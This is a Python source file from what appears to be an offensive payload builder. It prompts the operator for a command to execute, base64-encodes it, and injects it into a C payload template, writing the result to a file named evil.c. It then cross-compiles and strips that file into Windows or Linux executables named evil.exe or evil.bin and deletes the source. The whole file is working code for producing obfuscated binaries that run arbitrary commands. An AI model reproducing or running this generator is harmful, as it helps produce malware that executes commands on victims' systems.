#generate
import base64
import sys, os
from lib import payload


def generate_linux():
    command_line_payload = input("exec-cmd (\033[95m E.g: whoami && id\033[0m)> ")
    message_bytes = command_line_payload.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base_command = base64_bytes.decode('ascii')

    source = payload.payload_generate.replace("cakeisgoodiguess999", base_command)
    create_payloadsrc_file = open("output/evil.c", "w")
    create_payloadsrc_file.write(source)
    create_payloadsrc_file.close()
    read_source = open("output/evil.c", "r").read()
    newsource = read_source.replace("#include <winsock2.h>", "// linux")
    src = newsource.replace("#include <windows.h>", "// linux")
    edit_for_linux = open("output/evil.c", "w")
    edit_for_linux.write(src)
    edit_for_linux.close()
    print("[\033[95m!\033[0m] Source deployed at output/")
    print("1. 64 Bit (recommended)")
    print("2. 32 Bit")
    option_bit = input("bit (\033[95m E.g: 1\033[0m)> ")
    if option_bit == "1":
        linux_sixty()
    elif option_bit == "2":
        linux_thirty()
    else:
        print("bye :(")
        exit()

def generate_windows():
    command_line_payload = input("exec-cmd (\033[95m E.g: calc.exe\033[0m)> ")
    message_bytes = command_line_payload.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base_command = base64_bytes.decode('ascii')

    source = payload.payload_generate.replace("cakeisgoodiguess999", base_command)
    create_payloadsrc_file = open("output/evil.c", "w")
    create_payloadsrc_file.write(source)
    create_payloadsrc_file.close()
    print("[\033[95m!\033[0m] Source deployed at output/")
    print("1. 64 Bit (recommended)")
    print("2. 32 Bit")
    option_bit = input("bit (\033[95m E.g: 1\033[0m)> ")
    if option_bit == "1":
        windows_sixty()
    elif option_bit == "2":
        windows_thirty()
    else:
        print("bye :(")
        exit()

def windows_sixty():
    os.system("x86_64-w64-mingw32-gcc -Wall output/evil.c -o output/evil.exe && x86_64-w64-mingw32-strip output/evil.exe")
    os.system("rm output/evil.c")
    print("[\033[95m*\033[0m] Exe deployed at output/")

def windows_thirty():
    os.system("i686-w64-mingw32-gcc -Wall output/evil.c -o output/evil.exe && i686-w64-mingw32-strip output/evil.exe")
    os.system("rm output/evil.c")
    print("[\033[95m*\033[0m] Exe deployed at output/")

def linux_sixty():
    os.system("x86_64-linux-gnu-gcc -Wall output/evil.c -o output/evil.bin && x86_64-linux-gnu-strip output/evil.bin")
    os.system("rm output/evil.c")
    print("[\033[95m*\033[0m] Bin deployed at output/")

def linux_thirty():
    os.system("i686-linux-gnu-gcc -Wall output/evil.c -o output/evil.bin && i686-linux-gnu-strip output/evil.bin")
    os.system("rm output/evil.c")
    print("[\033[95m*\033[0m] Bin deployed at output/")
